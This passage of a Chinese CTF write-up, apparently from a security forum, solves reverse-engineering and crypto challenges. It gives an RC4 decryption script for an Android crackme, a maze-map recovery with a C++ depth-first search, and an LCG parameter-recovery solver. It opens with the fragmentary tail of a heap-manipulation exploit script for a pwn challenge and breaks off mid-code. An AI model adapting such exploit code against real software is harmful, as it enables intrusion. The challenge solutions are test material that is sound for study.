punctuation">]</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>tmp<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">0xae</span><span class="token punctuation">]</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>tmp<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">0xa7</span><span class="token punctuation">]</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>tmp<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">0xa6</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0x7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>tmp<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">0x8f</span><span class="token operator">-</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0x6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>tmp<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">0x77</span><span class="token operator">-</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>tmp<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">0x6f</span><span class="token punctuation">]</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>tmp<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">0x6e</span><span class="token punctuation">]</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>tmp<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">0x68</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''edit(0,tmp[:0x6f])edit(0,tmp[:0x6e])edit(0,tmp[:0x67])edit(0,tmp[:0x66])for i in range(0x6):    edit(0,tmp[:0x5f-i])for i in range(0x16):    edit(0,tmp[:0x48-i])for i in range(0x3):    edit(0,tmp[:0x31-i])for i in range(0x24):    edit(0,tmp[:0x24-i])'''</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>ti<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><h3 id="re1-crackme2-apk1"><a class="header-anchor" href="#re1-crackme2-apk1">¶</a>re1_crackme2_apk1</h3><p>这题老早就出了，有个函数用自己的了，和题目有点区别，导致flag一直不对，后面过了好久才反应过来，痛失一血。</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-b0b096768b028daddb86db220d88a65a860854a1.png" alt="图片.png"></p><p>encode函数</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-392b97a055c674c08bce2ff0307b0d5cf86adbf3.png" alt="图片.png"><br>明显的RC4特征，直接跑存好的脚本</p><figure><div class="code-wrapper"><pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">import base64def rc4_main(key &#x3D; &quot;init_key&quot;, message &#x3D; &quot;init_message&quot;):    print(&quot;RC4解密主函数调用成功&quot;)    print(&#39;\n&#39;)    s_box &#x3D; rc4_init_sbox(key)    crypt &#x3D; rc4_excrypt(message, s_box)    return crypt    def rc4_init_sbox(key):    s_box &#x3D; list(range(256))     print(&quot;原来的 s 盒：%s&quot; % s_box)    print(&#39;\n&#39;)    j &#x3D; 0    for i in range(256):        j &#x3D; (j + s_box[i] + ord(key[i % len(key)])) % 256        s_box[i], s_box[j] &#x3D; s_box[j], s_box[i]    print(&quot;混乱后的 s 盒：%s&quot;% s_box)    print(&#39;\n&#39;)    return s_box    def rc4_excrypt(plain, box):    print(&quot;调用解密程序成功。&quot;)    print(&#39;\n&#39;)    plain &#x3D; base64.b64decode(plain.encode(&#39;utf-8&#39;))    plain &#x3D; bytes.decode(plain)    res &#x3D; []    i &#x3D; j &#x3D; 0    for s in plain:        i &#x3D; (i + 1) % 256        j &#x3D; (j + box[i] + 136) % 256        box[i], box[j] &#x3D; box[j], box[i]        t &#x3D; (box[i] + box[j]) % 256        k &#x3D; box[t]        res.append(chr(ord(s) ^ k))    print(&quot;res用于解密字符串，解密后是：%res&quot; %res)    print(&#39;\n&#39;)    cipher &#x3D; &quot;&quot;.join(res)    print(&quot;解密后的字符串是：%s&quot; %cipher)    print(&#39;\n&#39;)    print(&quot;解密后的输出(没经过任何编码):&quot;)    print(&#39;\n&#39;)    return  cipher# # target &#x3D; [205, &#39;R&#39;, &#39;t&#39;, &#39;z&#39;, 30, &#39;\b&#39;, &#39;\b&#39;, 224, &#39;W&#39;, &#39;;&#39;, 24, 153, 175, &#39;&#x3D;&#39;, 29, 148, 21, &#39;%&#39;, &#39;g&#39;, &#39;[&#39;, &#39;d&#39;, &#39;S&#39;, 31, &#39;;&#39;, 220, 162, &#39;F&#39;, &#39;6&#39;, 211, 253, 190, &#39;3&#39;]# target &#x3D; [205, 82,  116, 122, 30,  8,     8,  224,  87, 59,  24, 153, 175, 61,  29, 148, 21, 37,   103, 91, 100,  83, 31, 59,  220, 162, 70,  54,  211, 253, 190, 51]# for i in range(len(target)):#     print(hex(target[i]))# print(target)0xcd,0x52,0x74,0x7a,0x1e,0x8,0x8,0xe0,0x57,0x3b,0x18,0x99,0xaf,0x3d,0x1d,0x94,0x15,0x25,0x67,0x5b,0x64,0x53,0x1f,0x3b,0xdc,0xa2,0x46,0x36,0xd3,0xfd,0xbe,0x33a&#x3D;[0xcd,0x52,0x74,0x7a,0x1e,0x8,0x8,0xe0,0x57,0x3b,0x18,0x99,0xaf,0x3d,0x1d,0x94,0x15,0x25,0x67,0x5b,0x64,0x53,0x1f,0x3b,0xdc,0xa2,0x46,0x36,0xd3,0xfd,0xbe,0x33]s&#x3D;&quot;&quot;for i in a:    s+&#x3D;chr(i)s&#x3D;str(base64.b64encode(s.encode(&#39;utf-8&#39;)), &#39;utf-8&#39;)rc4_main(&quot;happygame&quot;, s)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><h3 id="re3-meikyu2"><a class="header-anchor" href="#re3-meikyu2">¶</a>re3_meikyu2</h3><p>是个python文件，<a href="http://xn--main-kf5f3se02y.py">给了个main.py</a> 一个data 一个dll 和pyd文件。讲真第一次看见pyd，逻辑不难懂。</p><figure><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> mylib<span class="token punctuation">.</span>pyd<span class="token keyword">from</span> mylib<span class="token punctuation">.</span>pyd <span class="token keyword">import</span> CheckStatus <span class="token keyword">as</span> CS<span class="token punctuation">,</span> START<span class="token punctuation">,</span> END<span class="token punctuation">,</span> WALL<span class="token punctuation">,</span> ROAD<span class="token keyword">import</span> os<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span><span class="token string">'data'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Missing file: data'</span><span class="token punctuation">)</span>        exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'data'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        data <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>        map_ <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>    cipher <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token string">b'suta-to'</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i<span class="token punctuation">,</span> ch <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>map_<span class="token punctuation">)</span><span class="token punctuation">:</span>        map_<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> ch <span class="token operator">^</span> cipher<span class="token punctuation">[</span>i <span class="token operator">%</span> <span class="token builtin">len</span><span class="token punctuation">(</span>cipher<span class="token punctuation">)</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> map_<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token keyword">not</span> <span class="token keyword">in</span> <span class="token punctuation">(</span>START<span class="token punctuation">,</span> END<span class="token punctuation">,</span> WALL<span class="token punctuation">,</span> ROAD<span class="token punctuation">)</span><span class="token punctuation">:</span>            exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    key <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'Input key:'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">match</span> mylib<span class="token punctuation">.</span>check<span class="token punctuation">(</span>map_<span class="token punctuation">,</span> <span class="token builtin">list</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">case</span> CS<span class="token punctuation">.</span>FAIL<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Wrong key'</span><span class="token punctuation">)</span>        <span class="token keyword">case</span> CS<span class="token punctuation">.</span>SUCCESS<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Congratulations!!! Your flag is: `flag&#123;md5(key)&#125;`'</span><span class="token punctuation">)</span>        <span class="token keyword">case</span> CS<span class="token punctuation">.</span>ERROR_CIPHER_LEN <span class="token operator">|</span> CS<span class="token punctuation">.</span>ERROR_DATA_LEN <span class="token operator">|</span> CS<span class="token punctuation">.</span>ERROR_FMT <span class="token operator">|</span> CS<span class="token punctuation">.</span>FATAL_ERROR<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Something wrong, can you figure out?'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Bye~'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>网上导入pyd的方式都试过了，没办法成功导入这个mylib。所以对其中的一些函数只能ida逆向，而不太能调试分析。<br>答题的流程是制作一个map，然后用check函数检查。<br>题目给了提示是深度优先算法。</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-d99fa8c6867f6465e6ebe8bfc9054111af65dce7.png" alt="图片.png"></p><p>101*101的迷宫。<br>尝试恢复迷宫</p><figure><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># import mylib</span><span class="token comment"># from mylib import CheckStatus as CS, START, END, WALL, ROAD</span><span class="token keyword">import</span> os<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span><span class="token string">'data'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Missing file: data'</span><span class="token punctuation">)</span>                exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'data'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>                data <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>                map_ <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>        cipher <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token string">b'suta-to'</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> i<span class="token punctuation">,</span> ch <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>map_<span class="token punctuation">)</span><span class="token punctuation">:</span>                map_<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> ch <span class="token operator">^</span> cipher<span class="token punctuation">[</span>i <span class="token operator">%</span> <span class="token builtin">len</span><span class="token punctuation">(</span>cipher<span class="token punctuation">)</span><span class="token punctuation">]</span>                <span class="token keyword">if</span> map_<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">83</span><span class="token punctuation">:</span>                        map_<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'S'</span>                <span class="token keyword">elif</span> map_<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">35</span><span class="token punctuation">:</span>                        map_<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'0'</span>                <span class="token keyword">elif</span> map_<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">32</span><span class="token punctuation">:</span>                        map_<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'1'</span>                <span class="token keyword">elif</span> map_<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">69</span><span class="token punctuation">:</span>                        map_<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'X'</span>                <span class="token comment"># if map_[i] not in (START, END, WALL, ROAD):</span>                <span class="token comment">#         exit(0)</span>        <span class="token comment"># print(map_)</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">101</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">101</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                        <span class="token keyword">print</span><span class="token punctuation">(</span>map_<span class="token punctuation">[</span>i<span class="token operator">*</span><span class="token number">101</span><span class="token operator">+</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>        <span class="token comment">#print(map_)</span>        <span class="token comment"># key = input('Input key:').encode()</span>        <span class="token comment"># match mylib.check(map_, list(key)):</span>        <span class="token comment">#         case CS.FAIL:</span>        <span class="token comment">#                 print('Wrong key')</span>        <span class="token comment">#         case CS.SUCCESS:</span>        <span class="token comment">#                 print('Congratulations!!! Your flag is: `flag&#123;md5(key)&#125;`')</span>        <span class="token comment">#         case CS.ERROR_CIPHER_LEN | CS.ERROR_DATA_LEN | CS.ERROR_FMT | CS.FATAL_ERROR:</span>        <span class="token comment">#                 print('Something wrong, can you figure out?')</span>        <span class="token comment"># print('Bye~')</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>        main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>真的血亏，这里</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-fcb1cbf827d5de3bd60ccc30fdd49a51f3322b94.png" alt="图片.png"><br>当时写了i*100，不仅没拿到二血，还没做出来。。。。。</p><figure><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-nonespan aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>然后写个深度优先的脚本就可以解出来了。。</p><figure><div class="code-wrapper"><pre class="line-numbers language-C++" data-language="C++"><code class="language-C++">#include&lt;iostream&gt;#include&lt;cstdio&gt;#include&lt;cstring&gt;using namespace std;int x1[]&#x3D;&#123;1,0,-1,0&#125;,    y1[]&#x3D;&#123;0,1,0,-1&#125;;char w[] &#x3D; &#123;&#39;s&#39;,&#39;d&#39;,&#39;w&#39;,&#39;a&#39;&#125;;char f[103][103];char leng[500];int flag &#x3D; 0;bool vis[103][103];int n&#x3D;101;void dfs(int x,int y,int len)&#123;        vis[x][y] &#x3D; 1;        if(flag &#x3D;&#x3D; 1)        return;        if(f[x][y] &#x3D;&#x3D; &#39;2&#39;)        &#123;                for(int j &#x3D; 0;j&lt;&#x3D;len;++j)                cout&lt;&lt;leng[j];                flag &#x3D; 1;                cout&lt;&lt;endl;                return;         &#125;        for(int i &#x3D; 0;i&lt;4;++i)        &#123;                int nx &#x3D; x+x1[i];                int ny &#x3D; y+y1[i];                if(nx&lt;0||ny&lt;0||nx&gt;&#x3D;n||ny&gt;&#x3D;n||vis[nx][ny] &#x3D;&#x3D; 1)                continue;                if(f[nx][ny] &#x3D;&#x3D; &#39;0&#39;)                continue;                leng[len] &#x3D; w[i];                dfs(nx,ny,len+1);                vis[nx][ny] &#x3D; 0;        &#125; &#125;int main() &#123;                for(int i &#x3D; 0;i&lt;n;++i)         for(int j &#x3D; 0;j&lt;n;++j)                 cin&gt;&gt;f[i][j];        dfs(1,0,0); &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>md5之后就是flag</p><h3 id="密码1-LCG"><a class="header-anchor" href="#密码1-LCG">¶</a>密码1 LCG</h3><p>这个题看走眼，也是题目有点问题。</p><figure><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>flag <span class="token operator">=</span> getRandomNBitInteger<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">LCG</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>a <span class="token operator">=</span> getRandomNBitInteger<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>b <span class="token operator">=</span> getRandomNBitInteger<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>c <span class="token operator">=</span> getRandomNBitInteger<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>n <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>seed <span class="token operator">=</span> getRandomNBitInteger<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span>                <span class="token keyword">def</span> <span class="token function">next</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>seed <span class="token operator">=</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>a <span class="token operator">*</span> self<span class="token punctuation">.</span>seed <span class="token operator">*</span> self<span class="token punctuation">.</span>seed <span class="token operator">+</span> self<span class="token punctuation">.</span>b <span class="token operator">*</span> self<span class="token punctuation">.</span>seed <span class="token operator">+</span> self<span class="token punctuation">.</span>c<span class="token punctuation">)</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>n            <span class="token keyword">return</span> self<span class="token punctuation">.</span>seed                 <span class="token keyword">def</span> <span class="token function">output</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"b = &#123;&#125;\nn = &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>b<span class="token punctuation">,</span> self<span class="token punctuation">.</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"seed = &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>seed<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"s1 = &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span><span class="token builtin">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"s2 = &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span><span class="token builtin">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                        lcg <span class="token operator">=</span> LCG<span class="token punctuation">(</span><span class="token punctuation">)</span>            lcg<span class="token punctuation">.</span>output<span class="token punctuation">(</span><span class="token punctuation">)</span>            c1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>flag <span class="token operator">*</span> lcg<span class="token punctuation">.</span>a <span class="token operator">+</span> lcg<span class="token punctuation">.</span>c<span class="token punctuation">)</span> <span class="token operator">%</span> lcg<span class="token punctuation">.</span>n<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">16</span>            c2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>c1 <span class="token operator">*</span> lcg<span class="token punctuation">.</span>a <span class="token operator">+</span> lcg<span class="token punctuation">.</span>c<span class="token punctuation">)</span> <span class="token operator">%</span> lcg<span class="token punctuation">.</span>n<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">16</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"c1 = &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>c1<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"c2 = &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>c2<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"flag = &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span>                        <span class="token triple-quoted-string string">'''            b = 3831416627            n = 2273386207            seed = 2403188683            s1 = 260742417            s2 = 447908860            c1 = 17275            c2 = 28951            '''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>通过seed，s1,s2先算出lcg的a和c<br>这里通过c1,c2的计算是有些歧义的，最后的正解是c1是没有右移带入c2的运算的，不然按照原来代码是求不出flag的，当然这也导致了一波人解不出来,这里还需要注意最后的flag是32位，flag需要加个n</p><figure><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2b <span class="token operator">=</span> <span class="token number">3831416627</span>n <span class="token operator">=</span> <span class="token number">2273386207</span>seed <span class="token operator">=</span> <span class="token number">2403188683</span>s1 <span class="token operator">=</span> <span class="token number">260742417</span>s2 <span class="token operator">=</span> <span class="token number">447908860</span>c1 <span class="token operator">=</span> <span class="token number">17275</span>c2 <span class="token operator">=</span> <span class="token number">28951</span>a <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>s2<span class="token operator">-</span>s1<span class="token punctuation">)</span><span class="token operator">-</span>b<span class="token operator">*</span><span class="token punctuation">(</span>s1<span class="token operator">-</span>seed<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">*</span>gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span>s1<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">-</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>seed<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span>nc <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">-</span>a<span class="token operator">*</span>s1<span class="token operator">**</span><span class="token number">2</span> <span class="token operator">-</span> b<span class="token operator">*</span>s1 <span class="token operator">+</span> s2<span class="token punctuation">)</span><span class="token operator">%</span>n<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">**</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    c11 <span class="token operator">=</span> <span class="token punctuation">(</span>c1<span class="token operator">&lt;&lt;</span><span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">+</span> i    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>c11<span class="token operator">*</span>a<span class="token operator">+</span>c<span class="token 